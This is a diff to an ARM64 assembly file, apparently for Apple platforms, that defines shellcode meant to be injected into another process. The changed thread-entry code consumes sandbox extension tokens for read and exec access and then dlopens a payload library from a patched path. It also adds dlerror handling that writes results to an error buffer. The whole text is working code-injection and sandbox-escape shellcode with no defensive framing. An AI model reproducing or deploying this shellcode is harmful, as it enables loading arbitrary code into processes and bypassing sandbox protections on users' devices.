@@ -23,7 +23,6 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 
 */
-
 .section __DATA, __data
 
 .global ___shellcode_start
@@ -31,8 +30,11 @@ SOFTWARE.
 .global ___patch_pthread_create
 .global ___patch_sandbox_consume
 .global ___patch_dlopen
-.global ___data_payload_path
-.global ___data_sandbox_token
+.global ___patch_dlerror
+.global ___patch_payload_path
+.global ___patch_sandbox_token_read
+.global ___patch_sandbox_token_exec
+.global ___patch_error_buffer
 
 ___shellcode_start:
 	sub sp, sp, #0x30
@@ -60,6 +62,7 @@ ___shellcode_start:
 	b .
 
 	.align 4
+
 __thread_entry:
 	pacibsp
 	sub sp, sp, #0x30
@@ -69,20 +72,47 @@ __thread_entry:
 	stur w0, [x29, #-0x4]
 	str  x1, [sp, #0x10]
 
-	adr x0, ___data_sandbox_token
 	adr x9, ___patch_sandbox_consume
 	ldr x9, [x9]
+
+	adr x0, ___patch_sandbox_token_read
+	ldr x0, [x0]
+	cbz x0, 1f
 	blr x9
 
+1:
+	adr x0, ___patch_sandbox_token_exec
+	ldr x0, [x0]
+	cbz x0, 2f
+	blr x9
+
+2:
 	mov x1, #1
-	adr x0, ___data_payload_path
+	adr x0, ___patch_payload_path
+	ldr x0, [x0]
 	adr x9, ___patch_dlopen
 	ldr x9, [x9]
 	blr x9
 
-	ldp x29, x30, [sp, #0x20]
-	add sp, sp, #0x30
-	retab
+	adr x9, ___patch_error_buffer
+	ldr x9, [x9]
+	str x0, [x9]
+
+	cbnz x0, 3f
+
+	adr x9, ___patch_dlerror
+	ldr x9, [x9]
+	blr x9
+
+	adr x9, ___patch_error_buffer
+	ldr x9, [x9]
+	str x0, [x9, #8]
+
+3:
+	movz x0, #0x4e45
+	movk x0, #0x444f, lsl #16
+
+	b .
 
 	.align 3
 ___patch_pthread_create:
@@ -97,11 +127,23 @@ ___patch_dlopen:
 	.quad 0x0
 
 	.align 3
-___data_payload_path:
-	.zero 0x80
+___patch_dlerror:
+	.quad 0x0
 
 	.align 3
-___data_sandbox_token:
-	.zero 0x100
+___patch_payload_path:
+	.quad 0x0
+
+	.align 3
+___patch_sandbox_token_read:
+	.quad 0x0
+
+	.align 3
+___patch_sandbox_token_exec:
+	.quad 0x0
+
+	.align 3
+___patch_error_buffer:
+	.quad 0x0
 
 ___shellcode_end:
